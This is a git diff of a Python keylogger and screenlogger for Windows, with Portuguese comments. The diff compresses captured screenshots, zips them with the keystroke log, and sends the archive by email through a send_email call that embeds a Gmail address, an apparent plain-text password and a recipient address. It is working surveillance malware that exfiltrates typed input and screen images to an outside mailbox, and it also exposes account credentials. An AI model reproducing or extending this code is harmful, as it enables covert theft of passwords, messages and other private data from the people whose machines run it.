@@ -9,8 +9,7 @@ import win32ui
 import win32con
 import win32api
 from zipfile import ZipFile
-import PIL
-
+from PIL import Image
 
 
 def get_capslock_state():
@@ -134,7 +133,22 @@ with keyboard.Listener(on_press=on_press) as k_listener:
 mem_dc.DeleteDC()
 win32gui.DeleteObject(screenshot.GetHandle())
 
-print("[-] Keylogger finalizado!")
+print("[-] Keylogger e Screenlogger finalizados!")
+
+image_file1 = Image.open('screenshot1.jpg')
+image_file1.save("screenshot1.jpg", quality=65)
+
+image_file2 = Image.open('screenshot2.jpg')
+image_file2.save("screenshot2.jpg", quality=65)
+
+image_file3 = Image.open('screenshot3.jpg')
+image_file3.save("screenshot3.jpg", quality=65)
+
+image_file4 = Image.open('screenshot4.jpg')
+image_file4.save("screenshot4.jpg", quality=65)
+
+image_file5 = Image.open('screenshot5.jpg')
+image_file5.save("screenshot5.jpg", quality=65)
 
 # create a ZipFile object
 zipObj = ZipFile('log.zip', 'w')
@@ -148,10 +162,16 @@ zipObj.write('screenshot5.jpg')
 # close the Zip File
 zipObj.close()
 
-# try:
-send_email('mcpozebaiano@gmail.com', 'mcpozedorodo',
-           'd.lima@aln.senaicimatec.edu.br', 'keylogger')
-# except:
-#     print("Couldn't send email")
-# else:
-#     print("Email sent!")
+try:
+    send_email('mcpozebaiano@gmail.com', 'mcpozedorodo',
+               'd.lima@aln.senaicimatec.edu.br', 'keylogger')
+except:
+    print("Couldn't send email")
+else:
+    print("Email sent!")
+
+
+# To Do List:
+# - usar for loops para reduzir o código
+# - trocar path de todos os arquivos
+# - talvez usar mais funcões para estruturar o código
